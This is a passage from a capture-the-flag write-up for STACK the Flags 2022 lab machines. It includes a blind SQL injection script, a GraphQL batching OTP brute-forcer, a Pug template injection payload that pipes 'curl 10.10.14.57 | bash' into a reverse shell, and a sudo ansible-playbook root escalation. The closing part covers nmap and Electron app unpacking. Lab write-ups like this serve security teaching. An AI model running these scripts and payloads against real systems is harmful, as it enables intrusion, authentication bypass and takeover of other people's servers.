</span><span class="code-line"> <span class="token string">&quot;query&quot;</span><span class="token punctuation">:</span><span class="token punctuation">{</span>\<span class="token property">n</span>    <span class="token object">LoginUser</span><span class="token punctuation">{</span><span class="token attr-name">username</span><span class="token punctuation">:</span> \<span class="token string">&quot;admin\&quot;,password : \&quot;admin\&quot;}{\n     message,\n   token \n}\n}&quot;</span>
</span><span class="code-line"><span class="token punctuation">}</span>
</span></code></pre></div>
<p><a target="_blank" rel="noopener noreferrer" href="https://graphql.org/">GraphQL</a> is a popular query language for APIs that allows clients to query and mutate data on a server. This mutation queries a <code>LoginUser</code> function with the provided username and password. The function is expected to return a message and a token if the login is successful.</p>
<div class="relative"><pre><code class="language-graphql code-highlight"><span class="code-line"><span class="token keyword">mutation</span> <span class="token punctuation">{</span>
</span><span class="code-line">    <span class="token property-query property-mutation">LoginUser</span><span class="token punctuation">(</span><span class="token attr-name">username</span><span class="token punctuation">:</span> <span class="token string">&quot;admin&quot;</span><span class="token punctuation">,</span> <span class="token attr-name">password</span><span class="token punctuation">:</span> <span class="token string">&quot;admin&quot;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
</span><span class="code-line">        <span class="token property">message</span>
</span><span class="code-line">        <span class="token property">token</span>
</span><span class="code-line">    <span class="token punctuation">}</span>
</span><span class="code-line"><span class="token punctuation">}</span>
</span></code></pre></div>
<p>The first thing I tried was introspection, which allows clients to inspect the schema of a GraphQL server to understand the data and operations that are available. But it didn’t lead to anything.</p>
<h3 id="exploitation"><a href="#exploitation" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Exploitation</h3>
<p>Then, I’ve tried to add bad characters in the username field. Adding a single quote results in an interesting error:</p>
<div class="relative"><pre><code class="language-graphql code-highlight"><span class="code-line"><span class="token punctuation">{</span>
</span><span class="code-line"> <span class="token string">&quot;query&quot;</span><span class="token punctuation">:</span><span class="token punctuation">{</span>\<span class="token property">n</span>    <span class="token object">LoginUser</span><span class="token punctuation">{</span><span class="token attr-name">username</span><span class="token punctuation">:</span> \<span class="token string">&quot;admin&#x27;\&quot;,password : \&quot;admin\&quot;}{\n     message,\n   token \n}\n}&quot;</span>
</span><span class="code-line"><span class="token punctuation">}</span>
</span></code></pre></div>
<p>It seems like the username field is vulnerable to an SQL injection. Since GraphQL is somehow interacting with the SQL database, We’ll not be able to bypass the login with it.</p>
<p><img src="/static/images/stack-the-flags-2022/trying-sqli-query.png" alt="Trying Sqli Query"/></p>
<p>For the sake of this part, I’ll be using a time-based blind SQL injection attack to extract information from a GraphQL server. The code sends a series of HTTP requests to the server, each containing a slightly different GraphQL query, and measures the time taken for the server to respond to each request. By comparing the response times of different requests, the code is able to determine which requests were successful in extracting information from the server. If the response time is greater than 2 seconds, the code assumes that the query was successful in extracting information from the server, and the character that was used in the query is appended to the <code>res</code> string.In this case, I just guessed the table name and columns and I got a delay.</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line"><span class="token keyword">import</span> requests
</span><span class="code-line"><span class="token keyword">import</span> time
</span><span class="code-line"><span class="token keyword">import</span> os
</span><span class="code-line"><span class="token comment">#printable=&quot;a0123456789bcdefghijklmnopqrstuvwxyz&quot;</span>
</span><span class="code-line">printable<span class="token operator">=</span><span class="token string">&quot;0123456789abcdefABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>
</span><span class="code-line">res<span class="token operator">=</span><span class="token string">&quot;&quot;</span>
</span><span class="code-line"><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
</span><span class="code-line">    <span class="token keyword">for</span> char <span class="token keyword">in</span> printable<span class="token punctuation">:</span>
</span><span class="code-line">        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.6</span><span class="token punctuation">)</span>
</span><span class="code-line">        session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">        burp0_url <span class="token operator">=</span> <span class="token string">&quot;http://10.129.255.194:80/graphql&quot;</span>
</span><span class="code-line">        burp0_headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/json&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Accept&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;*/*&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Origin&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;http://10.129.255.194&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Referer&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;http://10.129.255.194/admin&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Accept-Encoding&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;gzip, deflate&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Accept-Language&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;en-US,en;q=0.9&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Connection&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;close&quot;</span><span class="token punctuation">}</span>
</span><span class="code-line">        burp0_json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&quot;query&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;mutation {\n    LoginUser(username: \&quot;-12&#x27; or (select sleep(2) from dual where (SELECT username from users ) like &#x27;&quot;</span><span class="token operator">+</span>res<span class="token operator">+</span>char<span class="token operator">+</span><span class="token string">&quot;%&#x27;)-- \&quot;, password: \&quot;a\&quot;){\n        message,\n        token    \n}\n}&quot;</span><span class="token punctuation">}</span>
</span><span class="code-line">        <span class="token comment">#print(burp0_json)</span>
</span><span class="code-line">        start <span class="token operator">=</span> time<span class="token punctuation">.</span>perf_counter<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span> json<span class="token operator">=</span>burp0_json<span class="token punctuation">)</span>
</span><span class="code-line">        request_time <span class="token operator">=</span> time<span class="token punctuation">.</span>perf_counter<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start
</span><span class="code-line">        <span class="token comment">#print(&quot;[Char: ]&quot;+char+&quot; &quot;+str(request_time))</span>
</span><span class="code-line">        <span class="token keyword">if</span> request_time <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
</span><span class="code-line">            res<span class="token operator">+=</span>char
</span><span class="code-line">            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;result: &quot;</span><span class="token operator">+</span>res<span class="token punctuation">)</span>
</span><span class="code-line">            <span class="token keyword">break</span>
</span></code></pre></div>
<p>We run the script and we’re able to retrieve the username!</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">hcue@pjsk:/tmp » python3 sql.py
</span><span class="code-line">result: J
</span><span class="code-line">result: Jo
</span><span class="code-line">result: Joh
</span><span class="code-line">result: John
</span></code></pre></div>
<p>Just for the sake of the length of the writeup, we can use similar script to retrieve the MD5 of John user and crack it with <a target="_blank" rel="noopener noreferrer" href="https://crackstation.net/">Crackstation</a> to get <code>iamcool</code>.</p>
<p>Logging in with user <code>John:iamcool</code> Works and we’re greeted with 2FA.</p>
<p><img src="/static/images/stack-the-flags-2022/otp-web.png" alt="A screenshot of OTP verification form. OTP will be sent through email, and will expire in 2 minutes"/></p>
<p>I tried to provide a random OTP to check the request and it’s a graphql query as well:</p>
<div class="relative"><pre><code class="language-graphql code-highlight"><span class="code-line"><span class="token punctuation">{</span>
</span><span class="code-line"> <span class="token string">&quot;query&quot;</span><span class="token punctuation">:</span><span class="token punctuation">{</span>\<span class="token property">n</span>    <span class="token object">verify2FA</span><span class="token punctuation">{</span><span class="token attr-name">otp</span><span class="token punctuation">:</span> \<span class="token string">&quot;1234\&quot;}{\n     message,\n   token \n}\n}&quot;</span>
</span><span class="code-line"><span class="token punctuation">}</span>
</span></code></pre></div>
<p>This GraphQL mutation queries a <code>verify2FA</code> function with the provided one-time password (OTP). The function is expected to return a message and a token if the OTP is valid.</p>
<p>The first thing I tried was to bruteforce but there is a ratelimit implemented which makes it quite impossible as the the OTP expires after 2 minutes.</p>
<p><img src="/static/images/stack-the-flags-2022/rate-limit.png" alt="A screenshot which shows that we’re being rate-limited"/></p>
<p>Since we’re not able to bruteforce it, I tried using GraphQL Batching, which improves performance by reducing the number of round trips between the client and the server. However, if not properly implemented, it can also create vulnerabilities that can be exploited. In our case, we will send a batch request containing a mix of legitimate and malicious queries. The server processes the legitimate queries and returns the results to us. In simpler words, we will be attempting to exploit a vulnerability in a GraphQL server that allows batching of multiple queries in a single request.</p>
<p>We will create a function that generates a GraphQL mutation containing multiple <code>verify2FA</code> queries with different one-time password (OTP) values and constructs a GraphQL mutation containing these queries and returns it. This is needed because we won’t be able to send all the OTP values at once.</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line"><span class="token keyword">def</span> <span class="token function">gen_payload</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    final<span class="token operator">=</span><span class="token string">&quot;&quot;</span>
</span><span class="code-line">    <span class="token keyword">for</span> token <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">&quot;%04d&quot;</span> <span class="token operator">%</span> I <span class="token keyword">for</span> I <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
</span><span class="code-line">        single <span class="token operator">=</span><span class="token string">&#x27;\n    jaja&#x27;</span><span class="token operator">+</span>token<span class="token operator">+</span><span class="token string">&#x27; : verify2FA(otp: \&quot;&#x27;</span><span class="token operator">+</span>token<span class="token operator">+</span><span class="token string">&#x27;\&quot;){\n        message,\n        token    }\n &#x27;</span>
</span><span class="code-line">        final<span class="token operator">+=</span>single
</span><span class="code-line">    payload <span class="token operator">=</span> <span class="token string">&#x27;mutation {\n   &#x27;</span><span class="token operator">+</span>final<span class="token operator">+</span><span class="token string">&#x27;  \n}&#x27;</span>
</span><span class="code-line">    <span class="token keyword">return</span> payload
</span></code></pre></div>
<p>Then we just keep bruteforcing until we get a hit and get the new token.</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line"><span class="token keyword">import</span> requests
</span><span class="code-line"><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
</span><span class="code-line">    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">    burp0_url <span class="token operator">=</span> <span class="token string">&quot;http://10.129.255.194:80/graphql&quot;</span>
</span><span class="code-line">    burp0_cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;session&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImpvaG4iLCJvdHBfdmVyaWZpY2F0aW9uIjpmYWxzZSwiaWF0IjoxNjcwMDIwMDYyLCJleHAiOjE2NzAwMjM2NjJ9.r624Ftvgxhuo7rNPeI1JeJpQzVTXON6cNpN0EAmABiE&quot;</span><span class="token punctuation">}</span>
</span><span class="code-line">    burp0_headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/json&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Accept&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;*/*&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Origin&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;http://10.129.255.194&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Referer&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;http://10.129.255.194/admin/otp_verfification&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Accept-Encoding&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;gzip, deflate&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Accept-Language&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;en-US,en;q=0.9&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Connection&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;close&quot;</span><span class="token punctuation">}</span>
</span><span class="code-line">    burp0_json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&quot;query&quot;</span><span class="token punctuation">:</span> gen_payload<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span>
</span><span class="code-line">    rar <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>burp0_cookies<span class="token punctuation">,</span> json<span class="token operator">=</span>burp0_json<span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">print</span><span class="token punctuation">(</span>rar<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">&quot;token&quot;</span> <span class="token keyword">in</span> rar<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;hurray: &quot;</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>
</span><span class="code-line">        <span class="token keyword">break</span>
</span><span class="code-line">    i<span class="token operator">+=</span><span class="token number">500</span>
</span></code></pre></div>
<p>And we just run the script until we get a hit:</p>
<p><img src="/static/images/stack-the-flags-2022/token-got.png" alt="A screenshot that shows that we got a valid token"/></p>
<p>Now we can use the new token to access the dashboard:</p>
<p><img src="/static/images/stack-the-flags-2022/dashboard-admin.png" alt="A screenshot of the admin dashboard"/></p>
<p>In the <code>/admin/setting</code> endpoint. We have a way to render a template!</p>
<p><img src="/static/images/stack-the-flags-2022/admin-ssti-template.png" alt="A screenshot of the admin templates section"/></p>
<p>So the first thing that comes in mind now is we find an SSTI. Knowing from the <code>Response Headers</code> that we’re dealing with an Express nodejs server. I just tried a bunch of payloads <code>{{7*7}} ${7*7} #{7*7}</code> And the <code>#{7*7}</code> works.</p>
<p><img src="/static/images/stack-the-flags-2022/pugssti-template.png" alt="A screenshot that shows the execution of pug ssti"/></p>
<p>This means that we’re dealing with a <code>pug ssti</code>.  I’ll be using the following payload where I am hosting a bash reverse shell in my local webserver and piping into bash.</p>
<div class="relative"><pre><code class="language-js code-highlight"><span class="code-line">#<span class="token punctuation">{</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>localLoad<span class="token operator">=</span>global<span class="token punctuation">.</span><span class="token property-access">process</span><span class="token punctuation">.</span><span class="token property-access">mainModule</span><span class="token punctuation">.</span><span class="token property-access">constructor</span><span class="token punctuation">.</span><span class="token property-access">_load</span><span class="token punctuation">;</span>sh<span class="token operator">=</span><span class="token function">localLoad</span><span class="token punctuation">(</span><span class="token string">&quot;child_process&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">exec</span><span class="token punctuation">(</span><span class="token string">&#x27;curl 10.10.14.57 | bash&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
</span></code></pre></div>
<p>And I get a shell as john and grab the flag:</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">hcue@pjsk:/tmp » rlwrap <span class="token function">nc</span> -lvnp <span class="token number">443</span>
</span><span class="code-line">listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">443</span> <span class="token punctuation">..</span>.
</span><span class="code-line">connect to <span class="token punctuation">[</span><span class="token number">10.10</span>.14.57<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.129</span>.228.37<span class="token punctuation">]</span> <span class="token number">44176</span>
</span><span class="code-line">can&#x27;t access <span class="token function">tty</span><span class="token punctuation">;</span> job control turned off
</span><span class="code-line">$ <span class="token function">id</span>
</span><span class="code-line">$ <span class="token builtin class-name">cd</span> ~
</span><span class="code-line">$ <span class="token function">cat</span> user.txt
</span><span class="code-line">STF22<span class="token punctuation">{</span>g410f27d35f21325f47d83c375dedf32<span class="token punctuation">}</span>
</span></code></pre></div>
<h3 id="privilege-escalation"><a href="#privilege-escalation" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Privilege Escalation</h3>
<p>First, I will stabilize my shell:</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">$ python3 -c <span class="token string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span>
</span><span class="code-line">john@bautycare:~$
</span><span class="code-line"><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  + <span class="token number">583791</span> suspended  rlwrap <span class="token function">nc</span> -lvnp <span class="token number">443</span>
</span><span class="code-line">hcue@pjsk:/tmp » stty raw -echo<span class="token punctuation">;</span><span class="token function">fg</span>
</span><span class="code-line"><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  + <span class="token number">583791</span> continued  rlwrap <span class="token function">nc</span> -lvnp <span class="token number">443</span>
</span><span class="code-line">john@beautycare:~$
</span><span class="code-line">john@beautycare:~$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">TERM</span></span><span class="token operator">=</span>xterm
</span><span class="code-line"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">TERM</span></span><span class="token operator">=</span>xterm
</span><span class="code-line">john@beautycare:~$
</span></code></pre></div>
<p>Then, I’ll check if we have any sudo rights:</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">john@beautycare:~$ <span class="token function">sudo</span> -l
</span><span class="code-line">Matching Defaults entries <span class="token keyword">for</span> john on beautycare:
</span><span class="code-line">    env_reset, mail_badpass,
</span><span class="code-line"><span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin
</span><span class="code-line">User john may run the following commands on beautycare:
</span><span class="code-line">    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/ansible-playbook
</span><span class="code-line">john@beautycare:~$
</span></code></pre></div>
<p>I just searched this binary in gtfobins and grabbed:</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line"><span class="token assign-left variable">TF</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp<span class="token variable">)</span></span>
</span><span class="code-line"><span class="token builtin class-name">echo</span> <span class="token string">&#x27;[{hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]}]&#x27;</span> <span class="token operator">&gt;</span><span class="token variable">$TF</span>
</span><span class="code-line"><span class="token function">sudo</span> /usr/bin/ansible-playbook <span class="token variable">$TF</span>
</span></code></pre></div>
<blockquote>
<p><a target="_blank" rel="noopener noreferrer" href="https://gtfobins.github.io/gtfobins/ansible-playbook/">https://gtfobins.github.io/gtfobins/ansible-playbook/</a></p>
</blockquote>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line"><span class="token assign-left variable">TF</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp<span class="token variable">)</span></span>
</span><span class="code-line"><span class="token builtin class-name">echo</span> <span class="token string">&#x27;[{hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]}]&#x27;</span> <span class="token operator">&gt;</span><span class="token variable">$TF</span>
</span><span class="code-line"><span class="token assign-left variable">TF</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp<span class="token variable">)</span></span>
</span><span class="code-line">john@beautycare:~$ <span class="token function">sudo</span> /usr/bin/ansible-playbook <span class="token variable">$TF</span>
</span><span class="code-line"><span class="token builtin class-name">echo</span> <span class="token string">&#x27;[{hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]}]&#x27;</span> <span class="token operator">&gt;</span><span class="token variable">$TF</span>
</span><span class="code-line">john@beautycare:~$ <span class="token function">sudo</span> /usr/bin/ansible-playbook <span class="token variable">$TF</span>
</span><span class="code-line"><span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span>: provided hosts list is empty, only localhost is available. Note that
</span><span class="code-line">the implicit localhost does not match <span class="token string">&#x27;all&#x27;</span>
</span><span class="code-line">PLAY <span class="token punctuation">[</span>localhost<span class="token punctuation">]</span> **************************************************************
</span><span class="code-line">TASK <span class="token punctuation">[</span>Gathering Facts<span class="token punctuation">]</span> *********************************************************
</span><span class="code-line">ok: <span class="token punctuation">[</span>localhost<span class="token punctuation">]</span>
</span><span class="code-line">TASK <span class="token punctuation">[</span>shell<span class="token punctuation">]</span> *******************************************************************
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># id</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token function">id</span>
</span><span class="code-line"><span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># cat /root/root.txt</span>
</span><span class="code-line"><span class="token function">cat</span> /root/root.txt
</span><span class="code-line">STF22<span class="token punctuation">{</span>3f62f62107c411482f5bc8caff1843e2<span class="token punctuation">}</span>
</span></code></pre></div>
<p>And that’s it \o/</p>
<h2 id="electrogrid-fullpwn-2000-points"><a href="#electrogrid-fullpwn-2000-points" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Electrogrid (Fullpwn, 2000 Points)</h2>
<h3 id="enumeration-1"><a href="#enumeration-1" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Enumeration</h3>
<p>We started with a simple <code>nmap</code> scan with the basic options:</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">hcue@pjsk:/tmp » nmap -sC -sV <span class="token number">10.129</span>.228.64 -v
</span><span class="code-line"><span class="token number">9000</span>/tcp <span class="token function">open</span>  cslistener?
</span><span class="code-line"><span class="token operator">|</span> fingerprint-strings:
</span><span class="code-line"><span class="token operator">|</span>   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LPDString, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:
</span><span class="code-line"><span class="token operator">|</span>     HTTP/1.1 <span class="token number">400</span> Bad Request
</span><span class="code-line"><span class="token operator">|</span>     Connection: close
</span><span class="code-line"><span class="token operator">|</span>   FourOhFourRequest:
</span><span class="code-line"><span class="token operator">|</span>     HTTP/1.1 <span class="token number">404</span> Not Found
</span><span class="code-line"><span class="token operator">|</span>     Content-Type: application/json<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8
</span><span class="code-line"><span class="token operator">|</span>     Content-Length: <span class="token number">32</span>
</span><span class="code-line"><span class="token operator">|</span>     Date: Mon, 05 Dec <span class="token number">2022</span> 09:45:20 GMT
</span><span class="code-line"><span class="token operator">|</span>     Connection: close
</span><span class="code-line"><span class="token operator">|</span>     <span class="token punctuation">{</span><span class="token string">&quot;message&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;404 page not found&quot;</span><span class="token punctuation">}</span>
</span><span class="code-line"><span class="token operator">|</span>   GetRequest, HTTPOptions:
</span><span class="code-line"><span class="token operator">|</span>     HTTP/1.1 <span class="token number">404</span> Not Found
</span><span class="code-line"><span class="token operator">|</span>     Content-Type: application/json<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8
</span><span class="code-line"><span class="token operator">|</span>     Content-Length: <span class="token number">32</span>
</span><span class="code-line"><span class="token operator">|</span>     Date: Mon, 05 Dec <span class="token number">2022</span> 09:45:13 GMT
</span><span class="code-line"><span class="token operator">|</span>     Connection: close
</span><span class="code-line"><span class="token operator">|</span>     <span class="token punctuation">{</span><span class="token string">&quot;message&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;404 page not found&quot;</span><span class="token punctuation">}</span>
</span><span class="code-line"><span class="token operator">|</span>   RTSPRequest:
</span><span class="code-line"><span class="token operator">|</span>     HTTP/1.1 <span class="token number">404</span> Not Found
</span><span class="code-line"><span class="token operator">|</span>     Content-Type: application/json<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8
</span><span class="code-line"><span class="token operator">|</span>     Content-Length: <span class="token number">32</span>
</span><span class="code-line"><span class="token operator">|</span>     Date: Mon, 05 Dec <span class="token number">2022</span> 09:45:14 GMT
</span><span class="code-line"><span class="token operator">|</span>     Connection: close
</span><span class="code-line"><span class="token operator">|</span>_    <span class="token punctuation">{</span><span class="token string">&quot;message&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;404 page not found&quot;</span><span class="token punctuation">}</span>
</span></code></pre></div>
<p>We just have port 9000 open in this case, which seems like an API. Nothing interesting here for now!</p>
<p>We are provided with <code>UserLandCityPC-1.0.0.AppImage</code>. We can start by unpacking/unarchiving it using <code>7z</code>:</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">hcue@pjsk:/tmp/userland » 7z x UserLandCityPC-1.0.0.AppImage
</span><span class="code-line"><span class="token operator">&lt;</span>SNIP<span class="token operator">&gt;</span>
</span><span class="code-line">Archives with Warnings: <span class="token number">1</span>
</span><span class="code-line">
</span><span class="code-line">Warnings: <span class="token number">1</span>
</span><span class="code-line">Folders: <span class="token number">19</span>
</span><span class="code-line">Files: <span class="token number">89</span>
</span><span class="code-line">Size:       <span class="token number">243843126</span>
</span><span class="code-line">Compressed: <span class="token number">95369065</span>
</span></code></pre></div>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">hcue@pjsk:/tmp/userland » <span class="token function">ls</span>
</span><span class="code-line">AppRun                  chrome_crashpad_handler  libEGL.so     libvk_swiftshader.so  LICENSES.chromium.html  resources.pak      UserLandCityPC-1.0.0.AppImage  usr
</span><span class="code-line">chrome_100_percent.pak  chrome-sandbox           libffmpeg.so  libvulkan.so.1        locales                 snapshot_blob.bin  userlandcitypc.desktop         v8_context_snapshot.bin
</span><span class="code-line">chrome_200_percent.pak  icudtl.dat               libGLESv2.so  LICENSE.electron.txt  resources               userlandcitypc     userlandcitypc.png             vk_swiftshader_icd.json
</span></code></pre></div>
<p>Checking the <code>resources</code> folder we can find an <code>asar</code> file:</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">hcue@pjsk:/tmp/userland » <span class="token builtin class-name">cd</span> resources
</span><span class="code-line">hcue@pjsk:/tmp/userland/resources » <span class="token function">ls</span>
</span><span class="code-line">app.asar
</span></code></pre></div>
<p>An <code>asar</code> file is a package file used by the Electron framework to store application code and other assets. So at this point, we’ll know that we’ll be dealing with an electron application.</p>
<p>I’ll use the following command to extract its content:</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">npx asar extract app.asar extract
</span></code></pre></div>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">hcue@pjsk:/tmp/userland/resources » <span class="token builtin class-name">cd</span> extract
</span><span class="code-line">hcue@pjsk:/tmp/userland/resources/extract » <span class="token function">ls</span> -la
</span><span class="code-line">total <span class="token number">40</span>
</span><span class="code-line">drwxr-xr-x  <span class="token number">5</span> hcue hcue <span class="token number">4096</span> Dec  <span class="token number">5</span> 04:58 <span class="token builtin class-name">.</span>
</span><span class="code-line">drwx------  <span class="token number">3</span> hcue hcue <span class="token number">4096</span> Dec  <span class="token number">5</span> 04:58 <span class="token punctuation">..</span>
</span><span class="code-line">-rwxr-xr-x  <span class="token number">1</span> hcue hcue  <span class="token number">713</span> Dec  <span class="token number">5</span> 04:58 index.html
</span><span class="code-line">-rwxr-xr-x  <span class="token number">1</span> hcue hcue <span class="token number">1488</span> Dec  <span class="token number">5</span> 04:58 index.js
</span><span class="code-line">drwxr-xr-x <span class="token number">20</span> hcue hcue <span class="token number">4096</span> Dec  <span class="token number">5</span> 04:58 node_modules
</span><span class="code-line">-rwxr-xr-x  <span class="token number">1</span> hcue hcue  <span class="token number">377</span> Dec  <span class="token number">5</span> 04:58 package.json
